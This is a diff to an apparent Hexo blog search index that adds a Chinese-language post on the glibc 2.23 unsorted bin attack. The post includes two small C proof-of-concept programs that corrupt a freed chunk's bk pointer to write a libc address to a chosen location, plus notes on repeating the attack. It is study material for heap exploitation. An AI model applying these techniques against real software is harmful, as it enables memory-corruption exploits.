@@ -4,6 +4,40 @@
   
   
   <entry>
+    <title>hexo</title>
+    <link href="/2024/05/05/hexo/"/>
+    <url>/2024/05/05/hexo/</url>
+    
+    <content type="html"><![CDATA[]]></content>
+    
+    
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title>Unsorted bin Attack</title>
+    <link href="/2024/05/05/Pwn/UnsortedbinAttack/"/>
+    <url>/2024/05/05/Pwn/UnsortedbinAttack/</url>
+    
+    <content type="html"><![CDATA[<h2 id="原理"><a href="#原理" class="headerlink" title="原理:"></a>原理:</h2><p><img src="/2024/05/05/Pwn/UnsortedbinAttack/image-20230918152039143.png" alt="image-20230918152039143"></p><p>Poc:   </p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-type">int</span> a[<span class="hljs-number">10</span>]=&#123;<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>&#125;;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>  <span class="hljs-type">long</span> <span class="hljs-type">long</span> <span class="hljs-type">int</span>* p=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x500</span>);<br>  <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>);<br>  <span class="hljs-built_in">free</span>(p);<br>  p[<span class="hljs-number">0</span>]=<span class="hljs-number">0</span>;<br>  p[<span class="hljs-number">1</span>]=(<span class="hljs-type">long</span> <span class="hljs-type">long</span> <span class="hljs-type">int</span>)a<span class="hljs-number">-0x10</span>; <span class="hljs-comment">//写bk为 target_addr -0x10</span><br>  <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x500</span>);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>libc版本：2.23</p><h2 id="调试过程"><a href="#调试过程" class="headerlink" title="调试过程"></a>调试过程</h2><p><img src="/2024/05/05/Pwn/UnsortedbinAttack/image-20230918152345657.png" alt="image-20230918152345657"></p><p><img src="/2024/05/05/Pwn/UnsortedbinAttack/image-20230918152424708.png" alt="image-20230918152424708"></p><p>修改bk为target_addr-0x10</p><p><img src="/2024/05/05/Pwn/UnsortedbinAttack/image-20230918152526167.png" alt="image-20230918152526167"></p><p>再次申请与unsorted bin相同大小chunk，在目标地址处写入main_arena+88 即top chunk指针处</p><p><img src="/2024/05/05/Pwn/UnsortedbinAttack/image-20230918152639050.png" alt="image-20230918152639050"></p><h2 id="tips"><a href="#tips" class="headerlink" title="tips:"></a>tips:</h2><p>如果申请与unsorted bin大小不同的chunk,能造成attack, 但是malloc会报错导致调用abort </p><h2 id="问题"><a href="#问题" class="headerlink" title="问题:"></a>问题:</h2><p>unsorted bin attack会对main_arena造成什么伤害，能不能进行二次attack?</p><p><img src="/2024/05/05/Pwn/UnsortedbinAttack/image-20230919145407350.png" alt="image-20230919145407350"></p><p>会在main_arena + 112处 写入目标地址+0x10</p><p>将其修改成104位置的原始值即可二次unsorted bin attack</p><h3 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-type">int</span> a[<span class="hljs-number">10</span>]=&#123;<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>&#125;;<br><span class="hljs-type">int</span> b[<span class="hljs-number">10</span>]=&#123;<span class="hljs-number">6</span>,<span class="hljs-number">7</span>,<span class="hljs-number">8</span>,<span class="hljs-number">9</span>&#125;;<br><span class="hljs-meta">#<span class="hljs-keyword">define</span> llt long long int</span><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>  <span class="hljs-built_in">fprintf</span>(stdout,<span class="hljs-string">&quot;unsorted bin attack\n&quot;</span>);<br>  <span class="hljs-type">long</span> <span class="hljs-type">long</span> <span class="hljs-type">int</span>* p=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x500</span>);<br>  <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>);<br>  <span class="hljs-built_in">free</span>(p);<br>  <span class="hljs-comment">//p[0]=0;</span><br>  p[<span class="hljs-number">1</span>]=(<span class="hljs-type">long</span> <span class="hljs-type">long</span> <span class="hljs-type">int</span>)a<span class="hljs-number">-0x10</span>;<br>  <span class="hljs-type">void</span>* p1=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x500</span>);<br>  <span class="hljs-built_in">fprintf</span>(stdout,<span class="hljs-string">&quot;%p\n&quot;</span>,*(llt*)a);<br>  <span class="hljs-comment">//rebuild bins</span><br>  llt* p2=*(llt*)a;<br>  p2[<span class="hljs-number">3</span>]=p1<span class="hljs-number">-0x10</span>;<br>  p[<span class="hljs-number">1</span>]=(<span class="hljs-type">long</span> <span class="hljs-type">long</span> <span class="hljs-type">int</span>)b<span class="hljs-number">-0x10</span>;<br>  <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x500</span>);<br>  <span class="hljs-built_in">fprintf</span>(stdout,<span class="hljs-string">&quot;%p&quot;</span>,*(llt*)b);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>经测试 fd修改与否没有影响</p>]]></content>
+    
+    
+    <categories>
+      
+      <category>Pwn</category>
+      
+      <category>Heap</category>
+      
+    </categories>
+    
+    
+  </entry>
+  
+  
+  
+  <entry>
     <title>概述</title>
     <link href="/2024/05/04/OS/%E6%A6%82%E8%BF%B0/"/>
     <url>/2024/05/04/OS/%E6%A6%82%E8%BF%B0/</url>
